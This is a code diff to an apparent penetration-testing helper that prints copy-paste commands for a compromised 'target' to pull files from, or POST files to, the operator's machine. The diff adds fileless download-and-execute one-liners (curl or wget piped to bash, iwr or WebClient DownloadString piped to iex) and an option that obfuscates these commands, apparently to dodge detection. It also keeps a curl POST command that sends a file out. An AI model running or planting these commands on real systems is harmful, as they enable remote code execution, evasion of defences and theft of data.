@@ -86,10 +86,10 @@ def _pick_interface_menu(choices: list[tuple[str, str]]) -> str | None:
 
 
 def pick_platform() -> str | None:
-    """Fuzzy pick Windows or Linux; return 'windows' or 'linux', or None to show both."""
+    """Fuzzy pick Windows or GNU/Linux; return 'windows' or 'linux', or None to show both."""
     if not sys.stderr.isatty():
         return None
-    choices = [("Windows", "windows"), ("Linux", "linux")]
+    choices = [("Windows", "windows"), ("GNU/Linux", "linux")]
     lines = [label for label, _ in choices]
     try:
         p = subprocess.run(
@@ -105,12 +105,12 @@ def pick_platform() -> str | None:
         selected = p.stdout.strip().lower()
         if selected == "windows":
             return "windows"
-        if selected == "linux":
+        if selected in ("linux", "gnu/linux"):
             return "linux"
         return None
     except (FileNotFoundError, subprocess.TimeoutExpired):
         pass
-    sys.stderr.write("\n  platform: 1) Windows  2) Linux  [1/2]: ")
+    sys.stderr.write("\n  platform: 1) Windows  2) GNU/Linux  [1/2]: ")
     sys.stderr.flush()
     try:
         line = input().strip() or "1"
@@ -192,6 +192,24 @@ def _target_send_win(base: str, path: str = "file", name: str = "file") -> str:
     return f"curl -X POST --data-binary @{path} {base}/{name}"
 
 
+def _target_inmemory_linux(base: str, path: str = "/path/to/file") -> list[str]:
+    """One-liners to download and execute in memory (no file on disk). Best for scripts."""
+    url = base.rstrip("/") + path
+    return [
+        f"curl -s {url} | bash",
+        f"wget -qO- {url} | bash",
+    ]
+
+
+def _target_inmemory_win(base: str, path: str = "/path/to/file") -> list[str]:
+    """One-liners to download and execute in memory (no file on disk). Best for PowerShell scripts."""
+    url = base.rstrip("/") + path
+    return [
+        f"iwr -Uri \"{url}\" -UseBasicParsing | iex",
+        f"(New-Object Net.WebClient).DownloadString(\"{url}\") | iex",
+    ]
+
+
 def pick_file_to_serve(dir_abs: str) -> str | None:
     """Fuzzy-pick a file under dir_abs; return relative path or None."""
     files: list[str] = []
@@ -221,10 +239,32 @@ def pick_file_to_serve(dir_abs: str) -> str | None:
         return None
 
 
-def _write_section(title: str, emoji: str, lines: list[str]) -> None:
+def _write_section(
+    title: str, emoji: str, lines: list[str], obfuscate: bool = False
+) -> None:
     sys.stderr.write(f"\n  {YELLOW}{BOLD}{emoji} {title}{RESET}\n")
     for line in lines:
-        sys.stderr.write(f"  {CYAN}{line}{RESET}\n")
+        if obfuscate:
+            from .obfuscate_ import obfuscate_bash, obfuscate_powershell
+            if any(
+                x in line
+                for x in (
+                    "iwr",
+                    "iex",
+                    "certutil",
+                    "bitsadmin",
+                    "OutFile",
+                    "WebClient",
+                    "Invoke-",
+                    "Net.WebClient",
+                )
+            ):
+                line = obfuscate_powershell(line)
+            else:
+                line = obfuscate_bash(line)
+            sys.stdout.write(line + "\n")
+        else:
+            sys.stderr.write(f"  {CYAN}{line}{RESET}\n")
 
 
 def print_commands_serve(
@@ -233,8 +273,9 @@ def print_commands_serve(
     serve_path: str | None = None,
     _base: str | None = None,
     _platform: str | None = None,
+    obfuscate: bool = False,
 ) -> tuple[str | None, str | None]:
-    """Print copy-paste commands for target. Call with _base and _platform from get_serve_base()."""
+    """Print copy-paste commands for target. When obfuscate=True, obfuscated commands go to stdout only."""
     if _base is None or _platform is None:
         return (None, None)
     base = _base
@@ -252,19 +293,25 @@ def print_commands_serve(
     if platform in (None, "linux"):
         recv_lines = _target_receive_linux(base, path=url_path, out=out_linux).strip().split("\n")
         send_lines = [_target_send_linux(base, path=f"./{send_path}", name=send_name)]
-        _write_section("Linux — receive (curl, wget, bash)", "🐧 ⬇️", recv_lines)
-        _write_section("Linux — send", "🐧 ⬆️", send_lines)
+        _write_section("GNU/Linux — receive (curl, wget, bash)", "🐧 ⬇️", recv_lines, obfuscate)
+        _write_section("GNU/Linux — in-memory execute (curl | bash, wget | bash)", "🐧 💾", _target_inmemory_linux(base, path=url_path), obfuscate)
+        _write_section("GNU/Linux — send", "🐧 ⬆️", send_lines, obfuscate)
     if platform in (None, "windows"):
         recv_lines = _target_receive_win(base, path=url_path, out=out_win).strip().split("\n")
         send_lines = [_target_send_win(base, path=send_path, name=send_name)]
-        _write_section("Windows — receive (curl, wget, certutil, iwr, bitsadmin)", "🪟 ⬇️", recv_lines)
-        _write_section("Windows — send", "🪟 ⬆️", send_lines)
+        _write_section("Windows — receive (curl, wget, certutil, iwr, bitsadmin)", "🪟 ⬇️", recv_lines, obfuscate)
+        _write_section("Windows — in-memory execute (iwr | iex, WebClient)", "🪟 💾", _target_inmemory_win(base, path=url_path), obfuscate)
+        _write_section("Windows — send", "🪟 ⬆️", send_lines, obfuscate)
     sys.stderr.write("\n")
     sys.stderr.flush()
+    if obfuscate:
+        sys.stdout.flush()
     return (base, platform)
 
 
-def print_commands_receive_listen(port: int, protocol: str = "http") -> None:
+def print_commands_receive_listen(
+    port: int, protocol: str = "http", obfuscate: bool = False
+) -> None:
     """Print copy-paste for target to POST file to you (host is listening)."""
     platform = pick_platform()
     my_ip = pick_interface()
@@ -273,7 +320,9 @@ def print_commands_receive_listen(port: int, protocol: str = "http") -> None:
     base = _base_url(my_ip, port)
     sys.stderr.write(f"\n  {BOLD}📋 Run on target (POST file to you):{RESET}\n")
     if platform in (None, "linux"):
-        _write_section("Linux — send", "🐧 ⬆️", [_target_send_linux(base)])
+        _write_section("GNU/Linux — send", "🐧 ⬆️", [_target_send_linux(base)], obfuscate)
     if platform in (None, "windows"):
-        _write_section("Windows — send", "🪟 ⬆️", [_target_send_win(base)])
+        _write_section("Windows — send", "🪟 ⬆️", [_target_send_win(base)], obfuscate)
     sys.stderr.write("\n")
+    if obfuscate:
+        sys.stdout.flush()
